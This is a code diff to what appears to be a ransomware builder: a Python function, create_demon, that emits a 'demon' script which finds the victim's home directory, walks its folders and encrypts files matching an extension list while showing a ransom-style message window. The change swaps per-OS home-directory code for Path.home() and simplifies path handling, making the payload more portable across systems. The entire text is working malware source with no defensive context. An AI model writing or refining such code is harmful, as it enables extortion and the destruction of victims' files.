@@ -4,6 +4,7 @@ def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debu
     demon = """#/usr/bin/env python3
 import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
 <import_pil>
+from pathlib import Path
 from tkinter import *
 from tkinter.ttk import *
 from io import BytesIO
@@ -41,22 +42,8 @@ platform = platform.system()
 ext = [<ext>]
 
 def get_target():
-    # Users home on Linux
-    if platform == 'Linux':
-        target = '/home/' + getpass.getuser() + '/'
-        return target
-
-    # Users home on Windows
-    elif platform == 'Windows':
-        target = 'C:\\\\Users\\\\' + getpass.getuser() + '\\\\'
-        return target
-
-    # Users home on MacOS
-    elif platform == 'Darwin':
-        target = '/Users/' + getpass.getuser() + '/'
-        return target
-    else:
-        sys.exit(1) # Cannot find users home directory.
+    # Get user home:
+    return str(Path.home()) + '/'
 
 def start_encrypt(p, key):
     message = '''<message>
@@ -72,10 +59,7 @@ def start_encrypt(p, key):
 
     try:
         for x in dirs:
-            if platform == 'Windows':
-                target = p + x + '\\\\'
-            else:
-                target = p + x + '/'
+            target = p + x + '/'
 
             for path, subdirs, files in os.walk(target):
                 for name in files:
